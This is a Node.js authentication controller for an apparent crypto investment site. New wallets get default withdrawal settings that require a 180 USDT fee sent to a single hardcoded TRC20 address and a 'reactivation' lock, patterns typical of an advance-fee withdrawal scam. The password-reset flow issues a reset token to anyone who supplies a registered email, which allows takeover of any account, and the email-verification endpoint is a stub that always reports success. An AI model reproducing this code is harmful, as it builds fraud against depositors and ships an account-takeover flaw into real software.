const User = require('../models/User');
const Wallet = require('../models/Wallet');
const jwt = require('jsonwebtoken');
const { asyncHandler } = require('../utils/asyncHandler');
const AppError = require('../utils/appError');
const { generateToken, generateRefreshToken, verifyRefreshToken } = require('../utils/generateToken');
const logger = require('../utils/logger');
const { sendVerificationEmail } = require('../services/emailService');

// ═══════════════════════════════════════════════════════════
// ✅ DEFAULT WITHDRAWAL SETTINGS (matching wallet model)
// ═══════════════════════════════════════════════════════════
const DEFAULT_WITHDRAWAL_SETTINGS = {
  withdrawalLimit: 1500,
  thresholdLimit: 1000,
  minimumWithdrawal: 1,
  iban: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  ccp: {
    feeAmount: 180,
    feeWalletAddress: 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1',
    feeWalletLabel: 'USDT (TRC20)',
    feePaid: false,
    lastPaidAt: null,
  },
  reactivation: {
    isRequired: true,
    isLocked: false,
    lockedAt: null,
    unlockedAt: null,
    unlockCount: 0,
  },
  bypassSecurityCheck: false,
};

// Register
exports.register = asyncHandler(async (req, res) => {
  const { fullName, email, phone, country, currency, password, referralCode } = req.body;

  // Check if user exists
  const existingUser = await User.findOne({ email });
  if (existingUser) {
    throw new AppError('User already exists', 400);
  }

  // Handle referral
  let referredBy = null;
  if (referralCode) {
    const referrer = await User.findOne({ referralCode });
    if (referrer) referredBy = referrer._id;
  }

  // Create user
  const user = await User.create({
    fullName,
    email,
    phone,
    country,
    currency,
    password,
    referredBy,
  });

  // Send verification email (optional)
  // await sendVerificationEmail(user);

  // ═══════════════════════════════════════════════════════════
  // ✅ CREATE WALLET WITH FULL PER-ACCOUNT SETTINGS
  // ═══════════════════════════════════════════════════════════
  await Wallet.create({
    user: user._id,

    // Balances
    balance: 0,
    profitBalance: 0,
    referralBalance: 0,
    totalDeposits: 0,
    totalWithdrawals: 0,

    // Crypto addresses (empty defaults)
    cryptoAddresses: {
      BTC: '',
      ETH: '',
      USDT: '',
      BNB: '',
      TRX: '',
    },

    // Pending amounts
    pendingDepositAmount: 0,
    pendingWithdrawalAmount: 0,

    // ✅ Per-account withdrawal settings
    withdrawalSettings: DEFAULT_WITHDRAWAL_SETTINGS,

    // ✅ Transaction counters
    transactionStats: {
      totalTransactions: 0,
      totalDepositCount: 0,
      totalWithdrawalCount: 0,
      lastDepositAt: null,
      lastWithdrawalAt: null,
    },

    // Account tier
    accountTier: 'standard',
  });

  logger.info(`✅ Wallet created for user ${user._id}`);

  // Generate tokens
  const token = generateToken(user);
  const refreshToken = generateRefreshToken(user);

  res.status(201).json({
    success: true,
    data: {
      user: { id: user._id, fullName, email, role: user.role },
      token,
      refreshToken,
    },
  });
});

// Login
exports.login = asyncHandler(async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email }).select('+password');
  if (!user) {
    throw new AppError('Invalid credentials', 401);
  }

  if (user.isLocked()) {
    throw new AppError('Account locked due to multiple failed attempts. Please try again later.', 403);
  }

  if (!user.isActive) {
    throw new AppError('Account Frozen. Please contact support.', 403);
  }

  const isMatch = await user.matchPassword(password);
  if (!isMatch) {
    await user.incrementLoginAttempts();
    throw new AppError('Invalid credentials', 401);
  }

  await user.resetLoginAttempts();
  user.lastLogin = new Date();
  await user.save({ validateBeforeSave: false });

  const token = generateToken(user);
  const refreshToken = generateRefreshToken(user);

  res.json({
    success: true,
    data: {
      user: { id: user._id, fullName: user.fullName, email: user.email, role: user.role },
      token,
      refreshToken,
    },
  });
});

// Refresh token
exports.refreshToken = asyncHandler(async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) {
    throw new AppError('Refresh token required', 400);
  }
  const decoded = verifyRefreshToken(refreshToken);
  const user = await User.findById(decoded.id);
  if (!user) {
    throw new AppError('Invalid refresh token', 401);
  }
  const newToken = generateToken(user);
  const newRefreshToken = generateRefreshToken(user);
  res.json({ success: true, token: newToken, refreshToken: newRefreshToken });
});

// Logout (client-side removes tokens)
exports.logout = asyncHandler(async (req, res) => {
  res.json({ success: true, message: 'Logged out' });
});

// Verify email (placeholder)
exports.verifyEmail = asyncHandler(async (req, res) => {
  res.json({ success: true, message: 'Email verified' });
});

// Verify email exists and return user
exports.verifyEmailExists = asyncHandler(async (req, res) => {
  const { email } = req.body;

  if (!email) {
    throw new AppError('Email is required', 400);
  }

  const user = await User.findOne({ email });
  if (!user) {
    throw new AppError('No account found with this email', 404);
  }

  const resetToken = jwt.sign(
    { id: user._id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '5m' }
  );

  res.json({
    success: true,
    message: 'Email verified. Please reset your password.',
    data: {
      token: resetToken,
      email: user.email,
    },
  });
});

// Reset password without email (direct)
exports.resetPasswordDirect = asyncHandler(async (req, res) => {
  const { token, newPassword, confirmPassword } = req.body;

  if (!token || !newPassword || !confirmPassword) {
    throw new AppError('All fields are required', 400);
  }

  if (newPassword !== confirmPassword) {
    throw new AppError('Passwords do not match', 400);
  }

  if (newPassword.length < 6) {
    throw new AppError('Password must be at least 6 characters', 400);
  }

  let decoded;
  try {
    decoded = jwt.verify(token, process.env.JWT_SECRET);
  } catch (error) {
    throw new AppError('Invalid or expired token. Please try again.', 400);
  }

  const user = await User.findById(decoded.id);
  if (!user) {
    throw new AppError('User not found', 404);
  }

  user.password = newPassword;
  await user.save();

  res.json({
    success: true,
    message: 'Password reset successfully. Please login with your new password.',
  });
});